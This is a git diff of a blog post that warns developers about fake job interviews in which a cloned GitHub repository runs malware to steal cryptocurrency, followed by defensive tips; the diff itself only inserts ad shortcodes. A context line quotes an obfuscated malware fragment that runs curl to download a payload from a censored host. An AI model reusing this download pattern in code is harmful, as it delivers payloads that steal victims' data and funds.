@@ -21,6 +21,8 @@ title: You Could Lose All Your Crypto In a Job Interview
 
 The other day I was browsing Elon Musk's political propaganda machine, also known as X, and came across this gem of human shamelessness, an interviewer who nearly hacked one of his applicants.
 
+{{<ad0>}}
+
 ## Running malware in job interviews.
 
 The story goes like this: you're in need of a job, you're attending the interview remotely, [the recruiter asks you to clone a Github library]({{< ref path="/posts/git/el-problema-de-usar-github-para-evaluar-a-desarrolladores/index.md" lang="en" >}}) to find bugs in the code, an average interview for a developer position, all looks normal up to this point. Of course you, in need of a good job, decide to go through with the process.
@@ -44,7 +46,7 @@ _0x42b722(“curl -Lo” + _0x157519 + “\” + “http://<censored>/pdown” +
   })
 ```
 
-{{<ad>}}
+{{<ad1>}}
 
 ## How do we avoid falling into these traps?
 
@@ -53,6 +55,8 @@ I don't plan to stand alone in the drama. This is about offering some practical 
 ### **Use a different device**.
 
 The most comfortable option, but also the most expensive, keep your devices separate, use one computer for work and technical interviews and another for your personal stuff, cryptocurrencies included. 
+
+{{<ad2>}}
 
 **Read the code, whenever possible**.
 
@@ -65,6 +69,8 @@ Mount a virtual machine, either Virtual Box or Gnome Boxes, on Linux, or a [comp
 Another option available, and my personal favorite: a live USB with the distribution of your choice (Debian, Fedora, or whatever you want), 
 
 That way, the worst that can happen is that they infect your virtual machine and not your real computer with all your personal information. Just be careful with shared volumes! If you mount the hard drive that contains sensitive information in the VM, you're toast.
+
+{{<ad3>}}
 
 **Encrypt your sensitive information**.
 
